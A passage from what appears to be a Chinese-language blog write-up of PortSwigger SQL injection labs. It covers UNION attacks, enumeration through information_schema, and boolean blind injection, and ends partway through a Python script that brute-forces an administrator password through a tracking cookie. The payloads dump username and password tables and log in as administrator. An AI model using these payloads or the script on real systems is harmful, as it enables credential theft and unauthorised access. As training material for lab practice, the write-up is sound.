<li>实验要求使用平台提供的随机值，因此将随机值插入到第二列中，即<code>?category=Accessories&#39; UNION SELECT NULL,&#39;eDqVcW&#39;,NULL-- </code><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB4-2-%E7%A1%AE%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%88%97%EF%BC%88%E4%BD%BF%E7%94%A8%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%8F%90%E4%BE%9B%E7%9A%84%E9%9A%8F%E6%9C%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B5%8B%E8%AF%95%EF%BC%89.png"></li>
<li>完成实验✅</li>
</ul>
</li>
</ul>
<h3 id="检索感兴趣的数据"><a href="#检索感兴趣的数据" class="headerlink" title="检索感兴趣的数据"></a>检索感兴趣的数据</h3><ul>
<li>当确定了原始查询返回的列数并找到了哪些列可以保存字符串数据时，就可以检索感兴趣的数据了。</li>
<li>假设：<ul>
<li>原始查询返回两列，这两列都可以保存字符串数据</li>
<li>注入点是<code>WHERE</code>子句中一个带引号的字符串</li>
<li>数据库包含一个名为<code>users</code>的表，其中包含<code>username</code>和<code>password</code>列</li>
</ul>
</li>
<li>在这个例子中，可以通过执行以下SQL注入UNION攻击来检索<code>username</code>和<code>password</code>列的数据：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username, password FROM users--</span></span><br></pre></td></tr></table></figure></li>
<li>为了执行这个攻击，需要<code>users</code>表及列的名称。如果没有，可以猜测表和列的名称。所有现代数据库都提供了检查数据库结构的方法，能够通过这些方法来确定表和列的名称。</li>
</ul>
<h4 id="🧪实验5：SQL注入UNION攻击，从其他表中检索数据"><a href="#🧪实验5：SQL注入UNION攻击，从其他表中检索数据" class="headerlink" title="🧪实验5：SQL注入UNION攻击，从其他表中检索数据"></a>🧪实验5：SQL注入UNION攻击，从其他表中检索数据</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。</li>
<li>数据库中包含一个名为<code>users</code>的表，其中包含<code>username</code>和<code>password</code>列。</li>
<li>任务：执行SQL注入UNION攻击，检索<code>username</code>和<code>password</code>列的数据，并使用这些信息以<code>administrator</code>的身份登录。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>首先确认列数：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line"># 成功，说明返回的列数为<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
<li>然后确定每一列的类型：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Accessories<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string">?category=Accessories&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># 两个都成功，说明两列都是字符串类型</span><br></pre></td></tr></table></figure></li>
<li>使用<code>?category=Accessories&#39; UNION SELECT username, password FROM users</code>进行注入，成功获取<code>username</code>和<code>password</code>列的数据<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB5-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png"></li>
<li>使用获得的用户名和密码登录成功</li>
<li>完成实验✅</li>
</ul>
</li>
</ul>
<h3 id="在单个列中检索多个值"><a href="#在单个列中检索多个值" class="headerlink" title="在单个列中检索多个值"></a>在单个列中检索多个值</h3><ul>
<li>在某些情况下，上一个示例中的查询可能只返回单个列。通过将值连接在一起，可以在此单个列中同时检索多个值。可以包含分隔符以区分组合值。</li>
<li>例子：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT username || &#x27;</span><span class="operator">~</span><span class="string">&#x27; || password FROM users--</span></span><br><span class="line"><span class="string"># 在Oracle数据库中，可以使用`||`连接运算符来连接值</span></span><br><span class="line"><span class="string"># 将`username`和`password`连接在一起，并使用`~`作为分隔符，查询的结果包含所有用户名和密码例如：</span></span><br><span class="line"><span class="string"># ···</span></span><br><span class="line"><span class="string"># administrator~s3cure</span></span><br><span class="line"><span class="string"># wiener~peter</span></span><br><span class="line"><span class="string"># ···</span></span><br></pre></td></tr></table></figure></li>
<li>不同的数据库使用不同的语法来执行字符串连接。详见<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></li>
</ul>
<h4 id="🧪实验6：SQL注入UNION攻击，在单个列中检索多个值"><a href="#🧪实验6：SQL注入UNION攻击，在单个列中检索多个值" class="headerlink" title="🧪实验6：SQL注入UNION攻击，在单个列中检索多个值"></a>🧪实验6：SQL注入UNION攻击，在单个列中检索多个值</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果在应用程序的响应中返回，因此可以使用UNION攻击从其他表中检索数据。</li>
<li>数据库包含一个名为<code>users</code>的表，其中包含<code>username</code>和<code>password</code>列。</li>
<li>任务：执行SQL注入UNION攻击，检索<code>username</code>和<code>password</code>列的数据，并使用这些信息以<code>administrator</code>的身份登录。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>首先确认列数：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Lifestyle&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- </span></span><br><span class="line"># 成功，说明返回的列数为<span class="number">2</span></span><br></pre></td></tr></table></figure></li>
<li>然后确认每一列的类型：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string"># 报错，说明第一列是不是字符串类型</span></span><br><span class="line"><span class="string">?category=Lifestyle&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># 成功，说明第二列是字符串类型</span><br></pre></td></tr></table></figure></li>
<li>只有一列是字符串，因此需要在单个列中检索<code>username</code>和<code>password</code>拼接值。</li>
<li>猜测这是一个mysql数据库，因此使用<code>CONCAT</code>函数进行拼接：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Lifestyle<span class="string">&#x27; UNION SELECT NULL,CONCAT(username, &#x27;</span><span class="operator">~</span><span class="string">&#x27;, password) FROM users-- </span></span><br></pre></td></tr></table></figure></li>
<li>查到用户名密码，可以使用administrator登录<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB6-1-%E8%8E%B7%E5%BE%97%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81.png"></li>
<li>完成实验✅</li>
</ul>
</li>
</ul>
<h3 id="检查SQL注入攻击中的数据库"><a href="#检查SQL注入攻击中的数据库" class="headerlink" title="检查SQL注入攻击中的数据库"></a>检查SQL注入攻击中的数据库</h3><ul>
<li>要利用SQL注入漏洞，通常需要查找有关数据库的信息，这包括：<ul>
<li><strong>数据库软件的类型和版本</strong></li>
<li><strong>数据库包含的表和列</strong></li>
</ul>
</li>
</ul>
<h4 id="检查数据库的版本和类型"><a href="#检查数据库的版本和类型" class="headerlink" title="检查数据库的版本和类型"></a>检查数据库的版本和类型</h4><p>以下是一些用来确定某些常用数据库类型的数据库版本：</p>
<table>
<thead>
<tr>
<th>数据库类型</th>
<th>查询</th>
</tr>
</thead>
<tbody><tr>
<td>Microsoft，MySQL</td>
<td><code>SELECT @@version</code></td>
</tr>
<tr>
<td>Oracle</td>
<td><code>SELECT * FROM v$version</code></td>
</tr>
<tr>
<td>PostgreSQL</td>
<td><code>SELECT version()</code></td>
</tr>
</tbody></table>
<ul>
<li>例子：<ul>
<li>使用<code>UNION SELECT @@version,NULL--</code>来检查数据库的版本</li>
<li>返回的输出结果如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)</span><br><span class="line">Mar 18 2018 09:11:49</span><br><span class="line">Copyright (c) Microsoft Corporation</span><br><span class="line">Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 &lt;X64&gt; (Build 14393: ) (Hypervisor)</span><br></pre></td></tr></table></figure></li>
<li>可以看到数据库的版本是<code>Microsoft SQL Server 2016</code></li>
</ul>
</li>
</ul>
<h4 id="🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）"><a href="#🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）" class="headerlink" title="🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）"></a>🧪实验7：SQL注入攻击，查询数据库类别和版本（思路没问题，但是不成功，猜测实验环境有问题）</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。可以使用UNION攻击从其他表中检索数据。</li>
<li>任务：执行SQL注入攻击，确定数据库的类型和版本。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>首先，确定返回的列数：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Pets<span class="string">&#x27; UNION SELECT NULL-- </span></span><br><span class="line"><span class="string">?category=Pets&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--  </span></span><br><span class="line">?category<span class="operator">=</span>Pets<span class="string">&#x27; UNION SELECT NULL,NULL--  </span></span><br><span class="line"><span class="string"># 不成功。。</span></span><br></pre></td></tr></table></figure>
<!-- ![](LAB7-1-查询返回的列数.png) --></li>
</ul>
</li>
</ul>
<h4 id="列出数据库的内容"><a href="#列出数据库的内容" class="headerlink" title="列出数据库的内容"></a>列出数据库的内容</h4><ul>
<li>大多数数据库类型（Oracle除外），都有一个名为<code>information_schema</code>的系统表，其中包含有关数据库的信息。可以使用这个表来列出数据库中的表和列。</li>
<li>例：<ul>
<li>可以查询<code>information_schema.tables</code>表来列出数据库中的表:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br></pre></td></tr></table></figure></li>
<li>结果示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE</span><br><span class="line">=====================================================</span><br><span class="line">MyDatabase     dbo           Products    BASE TABLE</span><br><span class="line">MyDatabase     dbo           Users       BASE TABLE</span><br><span class="line">MyDatabase     dbo           Feedback    BASE TABLE</span><br></pre></td></tr></table></figure></li>
<li>可以查询<code>information_schema.columns</code>表来列出数据库中的列:<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>结果示例：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE</span><br><span class="line">=================================================================</span><br><span class="line">MyDatabase     dbo           Users       UserId       int</span><br><span class="line">MyDatabase     dbo           Users       Username     varchar</span><br><span class="line">MyDatabase     dbo           Users       Password     varchar</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容"><a href="#🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容" class="headerlink" title="🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容"></a>🧪实验8：SQL注入攻击，列出非Oracle数据库上的数据库内容</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验在产品类别筛选器中包含一个SQL注入漏洞。查询结果将在应用程序的响应中返回，可以使用UNION攻击从其他表中检索数据。</li>
<li>应用程序具有登录功能，数据库包含一个保存用户名和密码的表。</li>
<li>任务：执行SQL注入攻击，确定表的名称和列的名称，查询所有用户的用户名和密码，以<code>administrator</code>的身份登录。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>首先确定原始查询返回的列数：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT NULL,NULL-- </span></span><br><span class="line"><span class="string"># 返回正常结果，所以返回的列数为2</span></span><br></pre></td></tr></table></figure></li>
<li>然后确定每一列的类型：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT &#x27;</span>a<span class="string">&#x27;,NULL-- </span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="string">&#x27;a&#x27;</span><span class="comment">-- </span></span><br><span class="line"># 两个都成功，说明两列都是字符串类型</span><br></pre></td></tr></table></figure></li>
<li>查询数据库中的表：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT table_name, NULL FROM information_schema.tables--</span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-1-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8.png"></li>
<li>发现一个名为<code>users_kdzjph</code>的表，猜测是目标表，尝试查询表中的列：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = &#x27;</span>pg_user_mappings<span class="string">&#x27;--  </span></span><br><span class="line"><span class="string">?category=Gifts&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> COLUMN_NAME, <span class="keyword">NULL</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users_kdzjph&#x27;</span><span class="comment">--  </span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-2-%E6%9F%A5%E7%9C%8Busers_kdzjph%E7%9A%84%E5%88%97.png"></li>
<li>查询到了<code>password_ifndxh</code>和<code>username_aeoisd</code>列，查询所有用户的用户名和密码：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT username_aeoisd,password_ifndxh FROM users_kdzjph--  </span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-3-%E6%9F%A5%E8%AF%A2%E5%88%B0%E6%89%80%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81.png"></li>
<li>使用获得的用户名和密码登录<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-4-%E7%99%BB%E5%BD%95%E6%88%90%E5%8A%9F.png"></li>
<li>完成实验✅</li>
<li>查询数据库中的类型：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category<span class="operator">=</span>Gifts<span class="string">&#x27; UNION SELECT version(),NULL--</span></span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB8-5-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B.png"></li>
</ul>
</li>
</ul>
<h2 id="SQL盲注入"><a href="#SQL盲注入" class="headerlink" title="SQL盲注入"></a>SQL盲注入</h2><h3 id="什么是SQL盲注？"><a href="#什么是SQL盲注？" class="headerlink" title="什么是SQL盲注？"></a>什么是SQL盲注？</h3><ul>
<li>当应用程序易受SQL注入攻击，但其HTTP响应不包含相关SQL查询的结果或任何数据库错误的详细信息时，就会发生SQL盲注。</li>
<li>许多技术（如<code>UNION</code>攻击）对SQL盲注漏洞无效，因为它们依赖于应用程序的响应中包含有关查询结果的信息。但是，可以使用其他技术来利用SQL盲注漏洞。</li>
</ul>
<h3 id="通过触发条件响应利用SQL盲注（布尔盲注）"><a href="#通过触发条件响应利用SQL盲注（布尔盲注）" class="headerlink" title="通过触发条件响应利用SQL盲注（布尔盲注）"></a>通过触发条件响应利用SQL盲注（布尔盲注）</h3><ul>
<li><p>考虑一个应用程序，它使用跟踪Cookie来收集有关使用情况的分析。对应用程序的请求包括一个cookie头，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</span><br></pre></td></tr></table></figure></li>
<li><p>当处理包含<code>TrackingId</code>的cookie的请求时，应用程序使用SQL查询来确定这是否是已知用户：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId <span class="operator">=</span> <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li><p>此查询易受SQL注入攻击，但查询结果不会返回给用户。但是应用程序的行为确实会有所不同，具体取决于查询是否返回数据。如果提交一个已识别的<code>TrackingId</code>，查询将返回数据，并且将在响应中收到一条“welcome back”的消息。</p>
</li>
<li><p>这种行为足以利用SQL盲注漏洞。可以通过有条件地触发不同的响应来检索信息，具体取决于注入的条件。</p>
</li>
<li><p>要确定漏洞是怎么工作的，假设发送了两个请求，cookie值中分别包含以下<code>TrackingId</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">…xyz<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">…xyz<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure></li>
<li><p>第一个请求将返回数据，因为注入的<code>AND &#39;1&#39;=&#39;1</code>条件为真。</p>
</li>
<li><p>第二个请求将不返回数据，因为注入的<code>AND &#39;1&#39;=&#39;2</code>条件为假。</p>
</li>
<li><p>这使我们能够确定任何单个注入条件的答案，并一次提取一个数据。</p>
</li>
<li><p>例如：</p>
<ul>
<li>假设有一个名为<code>Users</code>的表，其中包含<code>username</code>和<code>password</code>列，以及一个名为<code>Administators</code>的用户。我们可以通过发送一系列输入来确定此用户的密码，以便每次测试密码的一个字符。</li>
<li>首先可以输入：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) &gt; &#x27;m</span><br></pre></td></tr></table></figure></li>
<li>这将返回<code>Welcome back</code>，表明注入的条件为真，因此密码的第一个字符大于<code>m</code>。</li>
<li>然后可以输入：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) &gt; &#x27;t</span><br></pre></td></tr></table></figure></li>
<li>这将不返回<code>Welcome back</code>，表明注入的条件为假，因此密码的第一个字符不大于<code>t</code>。</li>
<li>最后输入以下信息，它返回<code>Welcome back</code>，表明密码的第一个字符是<code>s</code>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyz&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;Administrator&#x27;), 1, 1) = &#x27;s</span><br></pre></td></tr></table></figure></li>
<li>通过重复这个过程，可以确定密码的每个字符。</li>
</ul>
</li>
<li><p>注意：在Oracle数据库中，<code>SUBSTRING</code>函数被称为<code>SUBSTR</code>。详细可以参考<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">SQL injection cheat sheet</a></p>
</li>
</ul>
<h4 id="🧪实验9：带条件响应的SQL盲注"><a href="#🧪实验9：带条件响应的SQL盲注" class="headerlink" title="🧪实验9：带条件响应的SQL盲注"></a>🧪实验9：带条件响应的SQL盲注</h4><ul>
<li><p>实验说明</p>
<ul>
<li>本实验包含一个SQL盲注漏洞。应用程序使用跟踪cookie进行分析，并执行包含提交cookie值的SQL查询。</li>
<li>SQL查询的结果不会返回，也不显示错误消息。但是如果查询有返回，应用程序会在页面中显示“Welcome back”消息。</li>
<li>数据库包含一个名为<code>users</code>的表，其中包含<code>username</code>和<code>password</code>列。</li>
<li>任务：利用SQL盲注漏洞，确定<code>administrator</code>用户的密码，以<code>administrator</code>的身份登录。</li>
</ul>
</li>
<li><p>解题过程</p>
<ul>
<li>首先，确定注入点：在cookie的<code>TrackingId</code>中注入<code>&#39; AND &#39;1&#39;=&#39;1</code>和<code>&#39; AND &#39;1&#39;=&#39;2</code>，发现返回的结果不一样，说明存在注入点<br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-1-%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9.png"><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-2-%E6%B5%8B%E8%AF%95%E6%B3%A8%E5%85%A5%E7%82%B9.png"></li>
<li>拼接<code>TrackingId</code>，使用<code>AND</code>条件来判断密码的每一位<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), 1, 1) = &#x27;m</span><br></pre></td></tr></table></figure>
<img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-3-%E6%B5%8B%E8%AF%95%E5%AF%86%E7%A0%81%E7%AC%AC%E4%B8%80%E4%BD%8D.png"><br><img src="/2024/03/01/WriteUp-portswigger-SQL%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97/LAB9-3-%E5%BE%97%E5%88%B0%E5%AF%86%E7%A0%81%E7%AC%AC%E4%B8%80%E4%BD%8D.png"></li>
<li>其他位同理，通过输入<code>a-zA-Z0-9</code>来判断密码的每一位</li>
<li>手工注入费时费力，因此可以通过python编程实现，同时使用二分查找法，加快速度：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://0a4200f2037f22168015712d002c0009.web-security-academy.net/filter?category=Pets&quot;</span></span><br><span class="line">password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cookies = &#123;&quot;TrackingId&quot;: &quot;NEcgTt5umCL1PorI&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), 1, 1) &lt; &#x27;m; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa&quot;&#125;</span></span><br><span class="line">TrackingId_1=<span class="string">&quot;NEcgTt5umCL1PorI&#x27; AND SUBSTRING((SELECT password FROM users WHERE username = &#x27;administrator&#x27;), &quot;</span></span><br><span class="line"><span class="comment"># TrackingId_2</span></span><br><span class="line">TrackingId_3=<span class="string">&quot;, 1) &quot;</span></span><br><span class="line">TrackingId_4=<span class="string">&quot;&lt;&quot;</span></span><br><span class="line">TrackingId_5=<span class="string">&quot; &#x27;&quot;</span></span><br><span class="line"><span class="comment"># TrackingId_6</span></span><br><span class="line">TrackingId_7=<span class="string">&quot;; session=TAMJjOVBIkH0Dxb2XqzQwIFSZ0jWXvFa&quot;</span></span><br><span class="line"></span><br><span class="line">position = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 二分法查找</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;position: &quot;</span>,position)</span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line"></span><br><span class="line">        mid = (low + high+<span class="number">1</span>) // <span class="number">2</span>   <span class="comment"># 将mid的计算方式调整为(low + high + 1) // 2，可以确保在最后一次循环中不会陷入死循环。</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&quot;;&quot;</span>: <span class="comment"># 由于cookie中不能直接使用分号，所以需要转义</span></span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + <span class="string">&quot;\\&quot;</span>+<span class="built_in">chr</span>(mid) + TrackingId_7&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&quot;TrackingId&quot;</span>: TrackingId_1 + <span class="built_in">str</span>(position) + TrackingId_3 + TrackingId_4 + TrackingId_5 + <span class="built_in">chr</span>(mid) + 